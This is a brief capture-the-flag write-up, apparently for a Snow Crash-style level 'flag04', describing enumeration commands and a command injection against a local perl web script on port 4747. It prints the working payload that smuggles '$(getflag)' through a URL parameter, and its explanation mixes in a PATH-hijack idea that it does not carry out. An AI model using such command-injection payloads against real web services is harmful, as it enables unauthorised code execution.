## Project README: Finding flag04

Our routine: 
```bash
ls -la
find / -user flag04 -print 2>/dev/null
```

There is a file called **level04**
We print it with:
```bash 
cat level04
```
And realized, the file was a **perl script** running on port **4747**.

So the idea is to make this file run getflag cause in doing so we are not running getflag as user **level04** but as **flag04** since level04 file was created by **flag04**.

To do so, we add to **$PATH** in our env a path to **/tmp/** and create a file named **echo** whitch will run getflag when executed.

After decompile it, we realized there were a breach on **print echo $y 2>&1;** line.

We send many request with **curl** like :
```bash
curl http://localhost:4747/?x='getflag'
```

and finally, after many tries, we find the right syntaxe:
```bash
curl http://localhost:4747?x='$(getflag)'
```

